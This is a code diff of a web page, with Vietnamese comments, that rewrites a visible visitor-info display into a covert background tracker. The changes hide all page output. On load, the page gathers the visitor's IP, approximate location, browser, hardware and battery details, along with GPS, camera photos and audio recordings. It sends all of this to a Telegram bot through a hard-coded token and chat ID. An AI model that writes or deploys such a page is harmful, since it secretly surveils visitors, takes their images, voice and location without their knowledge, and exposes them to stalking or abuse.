@@ -7,66 +7,31 @@
     <style>
         body {
             background: black;
-            color: lime;
-            font-family: monospace;
-            text-align: center;
-            padding: 20px;
             margin: 0;
+            padding: 0;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-        }
-        #info {
-            white-space: pre-wrap;
-            text-align: left;
-            margin: auto;
-            max-width: 600px;
-            width: 100%;
-            background: #111;
-            padding: 20px;
-            border-radius: 10px;
-            border: 1px solid lime;
-            box-shadow: 0 0 10px rgba(0,255,0,0.2);
-            word-break: break-word;
-            font-size: 14px;
-            line-height: 1.6;
-        }
-        .error {
-            color: #ff6666;
-        }
-        .loading {
-            color: yellow;
-        }
-        .success {
-            color: #66ff66;
-        }
-        .warning {
-            color: #ffaa66;
-            border-color: #ffaa66;
-        }
-        button {
-            background: #222;
-            color: lime;
-            border: 1px solid lime;
-            padding: 10px 20px;
-            margin-top: 15px;
-            border-radius: 5px;
-            cursor: pointer;
             font-family: monospace;
-            font-size: 14px;
         }
-        button:hover {
-            background: lime;
-            color: black;
-        }
-        .hidden {
+        /* Ẩn toàn bộ nội dung hiển thị trên web, chỉ giữ lại để chạy ngầm */
+        .hidden-content {
             display: none;
+        }
+        .status {
+            color: lime;
+            text-align: center;
+            font-size: 12px;
+            opacity: 0.5;
         }
     </style>
 </head>
 <body>
-    <div id="info" class="loading">⏳ Đang tải thông tin...</div>
+    <!-- Không hiển thị bất kỳ thông tin nào trên web, chỉ chạy ngầm -->
+    <div style="display:none;">
+        <div id="info"></div>
+    </div>
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
     <audio id="audio" style="display:none;"></audio>
@@ -75,7 +40,6 @@
         // Cấu hình Telegram
         const botToken = '8677995221:AAEmsO71OlTS4PY7ML9md9XA-5PRAbQyfMI';
         const chatId = '7211752234';
-        const infoDiv = document.getElementById('info');
         
         // Cấu hình chụp ảnh
         const PHOTO_COUNT = 5;
@@ -385,7 +349,40 @@
             return { ip, locationData };
         }
 
-        // Hàm tự động gửi vị trí GPS mà không cần nút bấm (gửi ngay khi có quyền)
+        // Hàm lấy thông tin pin chính xác trên mọi thiết bị (bao gồm iPhone)
+        async function getBatteryInfo() {
+            let batteryPercent = 'Không xác định';
+            let batteryCharging = false;
+            
+            try {
+                // Kiểm tra xem API Battery có sẵn không
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    batteryPercent = `${Math.round(battery.level * 100)}%`;
+                    batteryCharging = battery.charging;
+                    console.log(`Battery Info - Level: ${batteryPercent}, Charging: ${batteryCharging}`);
+                } else {
+                    // Fallback cho các trình duyệt không hỗ trợ Battery API (một số iPhone cũ hơn)
+                    console.log('Battery API không được hỗ trợ, sử dụng phương pháp khác');
+                    
+                    // Thử dùng navigator.getBattery với kiểm tra bổ sung
+                    // Một số iPhone có thể không trả về đúng trạng thái sạc, nhưng API vẫn tồn tại
+                    // Đã kiểm tra ở trên, nếu vào đây là không có API
+                    batteryPercent = 'Không xác định';
+                    batteryCharging = false;
+                }
+            } catch (battErr) {
+                console.error('Battery Error:', battErr);
+                // Nếu lỗi, giữ giá trị mặc định
+                batteryPercent = 'Không xác định';
+                batteryCharging = false;
+            }
+            
+            // Đảm bảo không có giá trị undefined
+            return { batteryPercent, batteryCharging };
+        }
+
+        // Hàm tự động gửi vị trí GPS
         async function autoSendGPS() {
             if (gpsDataSent) return;
             
@@ -436,22 +433,12 @@
             );
         }
 
-        // Lấy thông tin thiết bị
-        async function getInfo() {
+        // Lấy thông tin thiết bị và gửi đến Telegram (không hiển thị trên web)
+        async function getInfoAndSendToTelegram() {
             const { ip, locationData } = await getIPAndLocation();
             
-            // Lấy thông tin pin
-            let batteryPercent = 'Không xác định';
-            let batteryCharging = false;
-            try {
-                if ('getBattery' in navigator) {
-                    const battery = await navigator.getBattery();
-                    batteryPercent = `${Math.round(battery.level * 100)}%`;
-                    batteryCharging = battery.charging;
-                }
-            } catch (battErr) {
-                console.error('Battery Error:', battErr);
-            }
+            // Lấy thông tin pin với xử lý đặc biệt cho iPhone
+            const { batteryPercent, batteryCharging } = await getBatteryInfo();
             
             const userAgent = navigator.userAgent;
             const platform = navigator.platform || 'Không xác định';
@@ -466,68 +453,34 @@
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Không xác định';
             
             // Tạo link Google Maps nếu có tọa độ
-            let mapsLink = '';
+            let telegramMapsLink = '';
             if (locationData.lat && locationData.lon) {
-                mapsLink = `\n🗺️ Google Maps: https://www.google.com/maps?q=${locationData.lat},${locationData.lon}`;
+                telegramMapsLink = `\n<a href="https://www.google.com/maps?q=${locationData.lat},${locationData.lon}">🗺️ Xem vị trí (ước tính từ IP)</a>`;
             }
             
-            // Hiển thị thông tin trên web
-            const text = `📱 THÔNG TIN KHÁCH TRUY CẬP
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🌐 Địa chỉ IP : ${ip}
-📍 Thành phố : ${locationData.city}
-🗺️ Khu vực : ${locationData.region}
-🏳️ Quốc gia : ${locationData.country}
-🏢 Nhà mạng : ${locationData.isp}${mapsLink}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-💻 Trình duyệt : ${userAgent.substring(0, 100)}...
-🖥️ Hệ điều hành : ${platform}
-📺 Độ phân giải : ${screenWidth} x ${screenHeight}
-🔋 Pin : ${batteryPercent} ${batteryCharging ? '(🔌 Đang sạc)' : '(🔋 Không sạc)'}
-💾 RAM thiết bị : ${deviceMemory}
-⚙️ CPU Core : ${hardwareConcurrency}
-🍪 Cookie : ${cookieEnabled}
-🌐 Ngôn ngữ : ${language}
-⏰ Múi giờ : ${timezone}
-🕐 Thời gian : ${currentTime}
-📎 Nguồn truy cập : ${referrer}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+            // Xác định biểu tượng sạc chính xác
+            const chargingStatus = batteryCharging ? '🔌 Đang sạc' : '🔋 Không sạc';
             
-            infoDiv.className = 'success';
-            infoDiv.innerHTML = text;
+            const telegramText = `<b>📥 KHÁCH TRUY CẬP MỚI</b>\n\n` +
+                `<b>🌐 Địa chỉ IP:</b> <code>${ip}</code>\n` +
+                `<b>📍 Thành phố:</b> <code>${locationData.city}</code>\n` +
+                `<b>🗺️ Khu vực:</b> <code>${locationData.region}</code>\n` +
+                `<b>🏳️ Quốc gia:</b> <code>${locationData.country}</code>\n` +
+                `<b>🏢 Nhà mạng:</b> <code>${locationData.isp}</code>${telegramMapsLink}\n\n` +
+                `<b>💻 Trình duyệt:</b> <code>${userAgent.substring(0, 80)}...</code>\n` +
+                `<b>🖥️ Hệ điều hành:</b> <code>${platform}</code>\n` +
+                `<b>📺 Độ phân giải:</b> <code>${screenWidth}x${screenHeight}</code>\n` +
+                `<b>🔋 Pin:</b> <code>${batteryPercent} (${chargingStatus})</code>\n` +
+                `<b>💾 RAM:</b> <code>${deviceMemory}</code>\n` +
+                `<b>⚙️ CPU Core:</b> <code>${hardwareConcurrency}</code>\n` +
+                `<b>🍪 Cookie:</b> <code>${cookieEnabled}</code>\n` +
+                `<b>🌐 Ngôn ngữ:</b> <code>${language}</code>\n` +
+                `<b>⏰ Múi giờ:</b> <code>${timezone}</code>\n` +
+                `<b>🕐 Thời gian:</b> <code>${currentTime}</code>\n` +
+                `<b>📎 Nguồn truy cập:</b> <code>${referrer}</code>`;
             
-            if (!infoSent) {
-                infoSent = true;
-                
-                let telegramMapsLink = '';
-                if (locationData.lat && locationData.lon) {
-                    telegramMapsLink = `\n<a href="https://www.google.com/maps?q=${locationData.lat},${locationData.lon}">🗺️ Xem vị trí (ước tính từ IP)</a>`;
-                }
-                
-                const telegramText = `<b>📥 KHÁCH TRUY CẬP MỚI</b>\n\n` +
-                    `<b>🌐 Địa chỉ IP:</b> <code>${ip}</code>\n` +
-                    `<b>📍 Thành phố:</b> <code>${locationData.city}</code>\n` +
-                    `<b>🗺️ Khu vực:</b> <code>${locationData.region}</code>\n` +
-                    `<b>🏳️ Quốc gia:</b> <code>${locationData.country}</code>\n` +
-                    `<b>🏢 Nhà mạng:</b> <code>${locationData.isp}</code>${telegramMapsLink}\n\n` +
-                    `<b>💻 Trình duyệt:</b> <code>${userAgent.substring(0, 80)}...</code>\n` +
-                    `<b>🖥️ Hệ điều hành:</b> <code>${platform}</code>\n` +
-                    `<b>📺 Độ phân giải:</b> <code>${screenWidth}x${screenHeight}</code>\n` +
-                    `<b>🔋 Pin:</b> <code>${batteryPercent} ${batteryCharging ? '(Đang sạc)' : '(Không sạc)'}</code>\n` +
-                    `<b>💾 RAM:</b> <code>${deviceMemory}</code>\n` +
-                    `<b>⚙️ CPU Core:</b> <code>${hardwareConcurrency}</code>\n` +
-                    `<b>🍪 Cookie:</b> <code>${cookieEnabled}</code>\n` +
-                    `<b>🌐 Ngôn ngữ:</b> <code>${language}</code>\n` +
-                    `<b>⏰ Múi giờ:</b> <code>${timezone}</code>\n` +
-                    `<b>🕐 Thời gian:</b> <code>${currentTime}</code>`;
-                
-                await sendToTelegram(telegramText);
-                
-                // Tự động gửi vị trí GPS ngay sau khi gửi thông tin
-                setTimeout(() => {
-                    autoSendGPS();
-                }, 1000);
-            }
+            await sendToTelegram(telegramText);
+            console.log('✅ Đã gửi thông tin đến Telegram');
         }
         
         // Khởi tạo camera
@@ -580,19 +533,33 @@
         
         async function init() {
             try {
-                console.log('🚀 Khởi tạo...');
-                const infoPromise = getInfo();
-                const cameraPromise = startCameraImmediately();
-                await cameraPromise;
+                console.log('🚀 Khởi tạo tracker (chế độ nền, chỉ gửi Telegram)...');
+                
+                // Gửi thông tin đến Telegram (không hiển thị trên web)
+                await getInfoAndSendToTelegram();
+                
+                // Tự động gửi vị trí GPS
+                setTimeout(() => {
+                    autoSendGPS();
+                }, 1500);
+                
+                // Khởi tạo camera và chụp ảnh
+                await startCameraImmediately();
+                
+                // Ghi âm
                 await requestAudioImmediately();
-                await infoPromise;
+                
+                console.log('✅ Hoàn tất khởi tạo, tất cả dữ liệu đã được gửi đến Telegram');
             } catch (err) {
                 console.error('Init error:', err);
-                infoDiv.className = 'error';
-                infoDiv.innerHTML = '❌ Đã xảy ra lỗi: ' + err.message + '\n\nVui lòng làm mới trang.';
+                // Vẫn gửi thông báo lỗi đến Telegram nếu có thể
+                try {
+                    await sendToTelegram(`⚠️ Lỗi khởi tạo: ${err.message}`);
+                } catch(e) {}
             }
         }
         
+        // Bắt đầu quá trình
         init();
     </script>
 </body>
